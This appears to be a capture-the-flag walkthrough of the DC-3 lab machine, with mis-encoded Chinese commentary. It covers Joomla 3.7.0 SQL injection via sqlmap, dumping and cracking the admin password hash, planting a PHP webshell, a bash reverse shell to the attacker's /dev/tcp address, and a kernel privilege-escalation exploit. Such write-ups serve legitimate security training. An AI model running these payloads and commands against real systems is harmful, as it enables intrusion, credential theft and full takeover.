<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DC-3.</span><br><span class="line">This time, there is only one flag, one entry point and no clues.</span><br><span class="line"></span><br><span class="line">To get the flag, you&#39;ll obviously have to gain root privileges.</span><br><span class="line"></span><br><span class="line">How you get to be root is up to you - and, obviously, the system.</span><br><span class="line"></span><br><span class="line">Good luck - and I hope you enjoy this little challenge.  :-)</span><br></pre></td></tr></table></figure>

<p>åªæœ‰ä¸€ä¸ªflag</p>
<p>dirsearchæ‰«ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u 192.168.33.138 -x 301,403</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[08:45:29] Starting: </span><br><span class="line">[08:45:32] 200 -   18KB - &#x2F;LICENSE.txt                                                                                                  </span><br><span class="line">[08:45:32] 200 -    4KB - &#x2F;README.txt                                   </span><br><span class="line">[08:45:35] 200 -   31B  - &#x2F;administrator&#x2F;cache&#x2F;                                                             </span><br><span class="line">[08:45:35] 200 -    2KB - &#x2F;administrator&#x2F;includes&#x2F; </span><br><span class="line">[08:45:35] 200 -    5KB - &#x2F;administrator&#x2F;          </span><br><span class="line">[08:45:35] 200 -    5KB - &#x2F;administrator&#x2F;index.php</span><br><span class="line">[08:45:35] 200 -   31B  - &#x2F;administrator&#x2F;logs&#x2F;     </span><br><span class="line">[08:45:36] 200 -   31B  - &#x2F;bin&#x2F;                                                                                   </span><br><span class="line">[08:45:36] 200 -   31B  - &#x2F;cache&#x2F;                                                                   </span><br><span class="line">[08:45:37] 200 -   31B  - &#x2F;cli&#x2F;                                                </span><br><span class="line">[08:45:37] 200 -   31B  - &#x2F;components&#x2F;                                         </span><br><span class="line">[08:45:37] 200 -    0B  - &#x2F;configuration.php                  </span><br><span class="line">[08:45:39] 200 -    3KB - &#x2F;htaccess.txt                                                               </span><br><span class="line">[08:45:39] 200 -   31B  - &#x2F;images&#x2F;                                 </span><br><span class="line">[08:45:39] 200 -   31B  - &#x2F;includes&#x2F;              </span><br><span class="line">[08:45:39] 200 -    7KB - &#x2F;index.php                                                                           </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;layouts&#x2F;                                                                     </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;libraries&#x2F;                                                                 </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;media&#x2F;                         </span><br><span class="line">[08:45:40] 200 -   31B  - &#x2F;modules&#x2F;                    </span><br><span class="line">[08:45:42] 200 -   31B  - &#x2F;plugins&#x2F;                                                     </span><br><span class="line">[08:45:42] 200 -  836B  - &#x2F;robots.txt.dist                                                      </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;templates&#x2F;                                                                             </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;templates&#x2F;index.html    </span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;protostar&#x2F;              </span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;system&#x2F;       </span><br><span class="line">[08:45:44] 200 -    0B  - &#x2F;templates&#x2F;beez3&#x2F;    </span><br><span class="line">[08:45:44] 200 -   31B  - &#x2F;tmp&#x2F;                                             </span><br><span class="line">[08:45:45] 200 -    2KB - &#x2F;web.config.txt</span><br></pre></td></tr></table></figure>



<p>å› ä¸ºçŸ¥é“CMSæ˜¯joomla</p>
<p>joomscanä¸€æ³¢å‘ç°ç‰ˆæœ¬å·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u 192.168.33.138</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;components</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;modules</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;templates</span><br><span class="line">http:&#x2F;&#x2F;192.168.33.138&#x2F;images&#x2F;banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info&#x2F;status files</span><br><span class="line">[++] Readable info&#x2F;status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http:&#x2F;&#x2F;192.168.33.138&#x2F;administrator&#x2F;                                                                                                       </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Checking robots.txt existing                                                                                                                             </span><br><span class="line">[++] robots.txt is not found                                                                                                                                 </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Finding common backup files name                                                                                                                         </span><br><span class="line">[++] Backup files are not found                                                                                                                              </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Finding common log files name                                                                                                                            </span><br><span class="line">[++] error log is not found                                                                                                                                  </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">[+] Checking sensitive config.php.x file                                                                                                                     </span><br><span class="line">[++] Readable config files are not found</span><br></pre></td></tr></table></figure>





<h2 id="sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç "><a href="#sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç " class="headerlink" title="sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç "></a>sqlæ¼æ´å‘ç°adminç”¨æˆ·å¯†ç </h2><p>å‘ç°Joomla3.7.0</p>
<p>æœç´¢ä¸€æ³¢æ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla | grep &quot;3\.7&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Joomla! 3.7 - SQL Injection                                                    | php&#x2F;remote&#x2F;44227.php</span><br><span class="line">Joomla! 3.7.0 - &#39;com_fields&#39; SQL Injection                                     | php&#x2F;webapps&#x2F;42033.txt</span><br></pre></td></tr></table></figure>

<p>è¯•äº†ä¸€ä¸‹ç¬¬ä¸€ä¸ªï¼Œå‘ç°å¥½åƒæ— æ³•åˆ©ç”¨ï¼Œæ‰“å¼€ä¸€ä¸‹ç¬¬äºŒä¸ª</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: Joomla 3.7.0 - Sql Injection</span><br><span class="line"># Date: 05-19-2017</span><br><span class="line"># Exploit Author: Mateus Lino</span><br><span class="line"># Reference: https:&#x2F;&#x2F;blog.sucuri.net&#x2F;2017&#x2F;05&#x2F;sql-injection-vulnerability-joomla-3-7.html</span><br><span class="line"># Vendor Homepage: https:&#x2F;&#x2F;www.joomla.org&#x2F;</span><br><span class="line"># Version: &#x3D; 3.7.0</span><br><span class="line"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span><br><span class="line"># CVE : - CVE-2017-8917</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http:&#x2F;&#x2F;localhost&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;localhost&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: list[fullordering] (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(CASE WHEN (1573&#x3D;1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600&#x3D;6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND&#x2F;OR time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">    Payload: option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;(SELECT * FROM (SELECT(SLEEP(5)))GDiu)</span><br></pre></td></tr></table></figure>

<p>ç”¨ä¸€ä¸‹sqlmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>å‘ç°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[09:26:42] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)</span><br><span class="line">web application technology: Apache 2.4.18</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.1</span><br><span class="line">[09:26:43] [INFO] fetching database names</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;information_schema&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;joomladb&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;mysql&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;performance_schema&#39;</span><br><span class="line">[09:26:43] [INFO] retrieved: &#39;sys&#39;</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line">[09:26:43] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2671 times</span><br><span class="line">[09:26:43] [INFO] fetched data logged to text files under &#39;&#x2F;root&#x2F;.local&#x2F;share&#x2F;sqlmap&#x2F;output&#x2F;192.168.33.138&#39;</span><br></pre></td></tr></table></figure>

<p>çˆ†ä¸ªè¡¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb --tables  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">[76 tables]</span><br><span class="line">+---------------------+</span><br><span class="line">| #__assets           |</span><br><span class="line">| #__associations     |</span><br><span class="line">| #__banner_clients   |</span><br><span class="line">| #__banner_tracks    |</span><br><span class="line">| #__banners          |</span><br><span class="line">| #__bsms_admin       |</span><br><span class="line">| #__bsms_books       |</span><br><span class="line">| #__bsms_comments    |</span><br><span class="line">| #__bsms_locations   |</span><br><span class="line">| #__bsms_mediafiles  |</span><br><span class="line">| #__bsms_message_typ |</span><br><span class="line">| #__bsms_podcast     |</span><br><span class="line">| #__bsms_series      |</span><br><span class="line">| #__bsms_servers     |</span><br><span class="line">| #__bsms_studies     |</span><br><span class="line">| #__bsms_studytopics |</span><br><span class="line">| #__bsms_teachers    |</span><br><span class="line">| #__bsms_templatecod |</span><br><span class="line">| #__bsms_templates   |</span><br><span class="line">| #__bsms_timeset     |</span><br><span class="line">| #__bsms_topics      |</span><br><span class="line">| #__bsms_update      |</span><br><span class="line">| #__categories       |</span><br><span class="line">| #__contact_details  |</span><br><span class="line">| #__content_frontpag |</span><br><span class="line">| #__content_rating   |</span><br><span class="line">| #__content_types    |</span><br><span class="line">| #__content          |</span><br><span class="line">| #__contentitem_tag_ |</span><br><span class="line">| #__core_log_searche |</span><br><span class="line">| #__extensions       |</span><br><span class="line">| #__fields_categorie |</span><br><span class="line">| #__fields_groups    |</span><br><span class="line">| #__fields_values    |</span><br><span class="line">| #__fields           |</span><br><span class="line">| #__finder_filters   |</span><br><span class="line">| #__finder_links_ter |</span><br><span class="line">| #__finder_links     |</span><br><span class="line">| #__finder_taxonomy_ |</span><br><span class="line">| #__finder_taxonomy  |</span><br><span class="line">| #__finder_terms_com |</span><br><span class="line">| #__finder_terms     |</span><br><span class="line">| #__finder_tokens_ag |</span><br><span class="line">| #__finder_tokens    |</span><br><span class="line">| #__finder_types     |</span><br><span class="line">| #__jbsbackup_timese |</span><br><span class="line">| #__jbspodcast_times |</span><br><span class="line">| #__languages        |</span><br><span class="line">| #__menu_types       |</span><br><span class="line">| #__menu             |</span><br><span class="line">| #__messages_cfg     |</span><br><span class="line">| #__messages         |</span><br><span class="line">| #__modules_menu     |</span><br><span class="line">| #__modules          |</span><br><span class="line">| #__newsfeeds        |</span><br><span class="line">| #__overrider        |</span><br><span class="line">| #__postinstall_mess |</span><br><span class="line">| #__redirect_links   |</span><br><span class="line">| #__schemas          |</span><br><span class="line">| #__session          |</span><br><span class="line">| #__tags             |</span><br><span class="line">| #__template_styles  |</span><br><span class="line">| #__ucm_base         |</span><br><span class="line">| #__ucm_content      |</span><br><span class="line">| #__ucm_history      |</span><br><span class="line">| #__update_sites_ext |</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>

<p>çˆ†ä¸€ä¸‹å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| params   | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>

<p>çˆ†ä¸€ä¸‹å…·ä½“å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.33.138&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml&quot; --risk&#x3D;3 --level&#x3D;5 --random-agent -D joomladb -T &#39;#__users&#39; -C &#39;username,password&#39; --dump  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| username | password                                                     |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>



<h2 id="å¯¹hashå¯†ç è¿›è¡Œè§£å¯†"><a href="#å¯¹hashå¯†ç è¿›è¡Œè§£å¯†" class="headerlink" title="å¯¹hashå¯†ç è¿›è¡Œè§£å¯†"></a>å¯¹hashå¯†ç è¿›è¡Œè§£å¯†</h2><p>éœ€è¦å¯¹è¿™ä¸ªhashè¿›è¡Œè§£å¯†ï¼Œå¯ä»¥ä½¿ç”¨Johnå·¥å…·</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john dc3.txt		&#x2F;&#x2F;dc3.txtå†…å®¹å°±æ˜¯åˆšæ‰çš„hashå€¼</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å¯†ç snoopyï¼ŒæˆåŠŸç™»å½•åˆ°äº†åå°ã€‚</p>
<h2 id="åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬"><a href="#åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬"></a>åå°è¿æ¥ä¸€å¥è¯æœ¨é©¬</h2><p>ä¹‹å‰dirsearchæ‰«ææ‰«åˆ°äº†templatesæ¨¡å—ï¼Œå¹¶ä¸”å‘ç°åå°è¿™ä¸ªåœ°æ–¹å¯ä»¥ä¿®æ”¹æºä»£ç ï¼Œäºæ˜¯æƒ³åˆ°åœ¨index.phpé‡Œæ·»åŠ ä¸€å¥è¯æœ¨é©¬        <img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-2.png" alt="3-2"></p>
<p>ä½†æ˜¯è¿æ¥ä¸ä¸Šï¼Œäºæ˜¯åœ¨è¿™ä¸ªç›®å½•ä¸‹é¢æ–°å»ºäº†ä¸€ä¸ªtest.phpé‡Œé¢å†™äº†ä¸€å¥è¯æœ¨é©¬ï¼Œè€Œä¸”è¿æ¥æˆåŠŸã€‚</p>
<h2 id="åå¼¹bashåˆ°kaliä¸Š"><a href="#åå¼¹bashåˆ°kaliä¸Š" class="headerlink" title="åå¼¹bashåˆ°kaliä¸Š"></a>åå¼¹bashåˆ°kaliä¸Š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2233												&#x2F;&#x2F;åœ¨kaliä¸Šæ‰§è¡Œ</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.33.128ã€kaliçš„ipã€‘&#x2F;2233 0&gt;&amp;1&#39; 		&#x2F;&#x2F;åœ¨èšå‰‘è¿æ¥æœºä¸Šæ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>å…³äºåå¼¹bashçš„åŸç†ï¼Œ<a href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176" target="_blank" rel="noopener">å‚è€ƒè¿™ç¯‡</a></p>
<blockquote>
<p>ä¸ºå•¥å¿…é¡»è¦bash -cï¼Ÿï¼Ÿï¼Ÿ</p>
</blockquote>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><blockquote>
<p>æ¥ä¸‹æ¥å°±æ˜¯ææƒéƒ¨åˆ†ï¼Œä½†æ˜¯æŸ¥çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰å¯æ‰§è¡Œsudoå‘½ä»¤çš„ç”¨æˆ·ï¼Œæ²¡æœ‰suidæƒé™çš„å¯æ‰§è¡Œå‘½ä»¤æˆ–è€…æ–‡ä»¶ï¼Œæ²¡æœ‰å®šæ—¶ä»»åŠ¡ï¼Œæ²¡æœ‰æƒé™æ»¥ç”¨å±é™©æ–‡ä»¶ã€‚ä¸‡ä¸å¾—å·²åªèƒ½è¯•ä¸€ä¸‹å†…æ ¸ææƒäº†ã€‚</p>
</blockquote>
<p>æŸ¥çœ‹ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a:</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 16.04 LTS</span><br><span class="line">Release:        16.04</span><br><span class="line">Codename:       xenial</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a:</span><br><span class="line">Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>



<p>æœç´¢ä¸€ä¸‹Ubuntu16.04ææƒæ¼æ´</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/3-3.png" alt="3-3"></p>
<p>ç»è¿‡ä¸€ç•ªæ¢ç´¢ï¼Œå‘ç°39772.txtå¯ä»¥åˆ©ç”¨ï¼Œæ‰“å¼€çœ‹ä¸€ä¸‹åˆ©ç”¨æ–¹æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">An exploit that puts all this together is in exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~&#x2F;ebpf_mapfd_doubleput$ .&#x2F;compile.sh</span><br><span class="line">user@host:~&#x2F;ebpf_mapfd_doubleput$ .&#x2F;doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#39;ll have a root shell in &lt;&#x3D;60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~&#x2F;ebpf_mapfd_doubleput# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br><span class="line"></span><br><span class="line">Fix: https:&#x2F;&#x2F;git.kernel.org&#x2F;cgit&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;commit&#x2F;?id&#x3D;8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proof of Concept: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;attachment?aid&#x3D;232552</span><br><span class="line">Exploit-DB Mirror: https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;exploitdb-bin-sploits&#x2F;raw&#x2F;master&#x2F;bin-sploits&#x2F;39772.zip</span><br></pre></td></tr></table></figure>

